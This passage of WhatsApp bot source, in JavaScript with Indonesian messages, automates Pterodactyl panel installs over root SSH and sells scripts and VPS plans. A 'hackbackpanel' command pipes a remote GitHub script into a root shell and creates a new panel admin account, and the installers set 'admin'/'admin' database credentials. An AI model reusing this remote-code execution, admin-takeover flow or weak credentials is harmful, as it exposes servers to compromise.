if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await ArroganzzReply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).XPanzect(XPanzSettings);
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return ArroganzzReply(mess.owner)
let t = text.split('|')
if (t.length < 3) return ArroganzzReply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const XPanzSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ArroganzzReply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
ArroganzzReply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('XPanzection Error: ' + err);
ArroganzzReply('Katasandi atau IP tidak valid');
}).XPanzect(XPanzSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return ArroganzzReply(mess.owner)
let t = text.split('|')
if (t.length < 2) return ArroganzzReply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const XPanzSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await XPanz.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('XPanzection Error: ' + err);
ArroganzzReply('Katasandi atau IP tidak valid');
}).XPanzect(XPanzSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("skyzoo|ipserver"))
if (!text.split("|")) return ArroganzzReply(example("skyzoo|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!args[0]) return ArroganzzReply("Domain tidak ditemukan!")
if (isNaN(args[0])) return ArroganzzReply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return ArroganzzReply("Domain tidak ditemukan!")
if (!args[1].split("|")) return ArroganzzReply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await ArroganzzReply(teks)
} else return ArroganzzReply(`${e['error']}`)
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
if (!text) return ArroganzzReply(example("skyzo,6283XXX"))
if (!args[1]) {
let list = []
let input
let cc = text.split(",")
if (cc.length > 1) {
input = text.split(",")[0] + "," 
input += m.mentionedJid[0] ? m.mentionedJid[0] : text.split(",")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
} else {
input = text
}
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1} ${input}`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}

if (Number(args[0]) > serverpanel.length) return ArroganzzReply("Server panel tidak ditemukan")
let nomor
let usernem
let tek = args[1].split(",")
if (tek.length > 1) {
let [users, nom] = args[1].split(",")
if (!users || !nom) return ArroganzzReply(example("server username,nomor\n\nuntuk melihat server ketik *.listserver*\n\ncontoh *.cadmin* 2 skyzo,6283XXX"))
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = args[1].toLowerCase()
nomor = m.chat
}

var onWa = await XPanz.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return ArroganzzReply("Nomor target tidak terdaftar di whatsapp!")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
let username = usernem
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ArroganzzReply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await ArroganzzReply(`Akun admin panel *${capital(username)}* berhasil dibuat! data username dan password sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await XPanz.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("cmd|responnya"))
if (!text.split("|")) return ArroganzzReply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return ArroganzzReply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return ArroganzzReply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
ArroganzzReply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return ArroganzzReply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
ArroganzzReply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (list.length < 1) return ArroganzzReply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
ArroganzzReply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addakses": case "addaksesgc": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.isGroup) return ArroganzzReply(mess.group)
const input = m.chat
if (premium.includes(input)) return ArroganzzReply(`Grup ini sudah di beri akses reseller panel!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
ArroganzzReply(`Berhasil menambah grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listakses": case "listaksesgc": {
if (premium.length < 1) return ArroganzzReply("Tidak ada user reseller")
let teks = `\n *乂 List all grup reseller panel*\n`
for (let i of premium) {
let name = (await XPanz.groupMetadata(i)).subject || "Tidak ditemukan"
teks += `\n* ${i}
* *Nama :* ${name}\n`
}
XPanz.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delakses": case "delaksesgc": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (premium.length < 1) return ArroganzzReply("Tidak ada grup reseller panel")
if (!text) {
let list = []
for (let i of premium) {
let name = (await XPanz.groupMetadata(i)).subject || "Tidak ditemukan"
list.push({
title: `${name}`, 
description: i, 
id: `.${command} ${i}`
})
}
list.push({
title: `All Group Reseller`, 
description: "All group reseller", 
id: `.${command} all`
})
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let input = text
if (text == "all") {
await premium.splice(0, premium.length)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
return ArroganzzReply(`Berhasil menghapus semua grup reseller panel ✅`)
}
if (!premium.includes(input)) return ArroganzzReply(`Grup ini bukan grup reseller panel!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
ArroganzzReply(`Berhasil menghapus grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listserverpanel": case "listserver": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
let tt = 0
let teks = "\n *── List all server panel*\n"
await serverpanel.forEach(e => teks += `\n* ${tt += 1}. ${e.domain.split("https://")[1]}\n`)
ArroganzzReply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delserverpanel": case "delserver": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}

list.push({
title: `All Server Panel`,
id: `.${command} all`
})

return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return ArroganzzReply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.delserver* 2"))
if (args[0] == "all") {
await serverpanel.splice(0, serverpanel.length)
await fs.writeFileSync("./settingpanel.json", JSON.stringify(serverpanel, null, 2))
return ArroganzzReply(`Berhasil menghapus semua server panel`)
}
if (Number(text) > serverpanel.length) return ArroganzzReply("Server panel tidak ditemukan")
let dom = serverpanel[Number(text) - 1].domain
await serverpanel.splice((Number(text) - 1), 1)
await fs.writeFileSync("./settingpanel.json", JSON.stringify(serverpanel, null, 2))
ArroganzzReply(`Berhasil menghapus server panel *${dom.split("https://")[1]}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidch": case "addch": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("idchnya"))
if (!text.endsWith("@newsletter")) return ArroganzzReply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return ArroganzzReply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
ArroganzzReply(`Berhasil menambah id channel kedalam database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delch": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (listidch.length < 1) return ArroganzzReply("Tidak ada id channel di database")
if (!text) return ArroganzzReply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return ArroganzzReply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return ArroganzzReply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return ArroganzzReply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
ArroganzzReply(`Berhasil menghapus id channel dari database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listch": {
if (listidch.length < 1) return ArroganzzReply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
XPanz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break


case "buyscript": case "buysc": {
if (m.isGroup) return ArroganzzReply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Simple Botz V5', 
                  description: "Rp35.000", 
                  id: '.buysc 1'
                },
                {
                  title: 'Simple Bot V6', 
                  description: "Rp50.000", 
                  id: '.buysc 2'
                },
                {
                  title: 'Web Rest API', 
                  description: "Rp50.000", 
                  id: '.buysc 3'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V5"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Script Simple Bot V6"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Web Rest API"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "buyvps": {
if (m.isGroup) return ArroganzzReply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return ArroganzzReply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
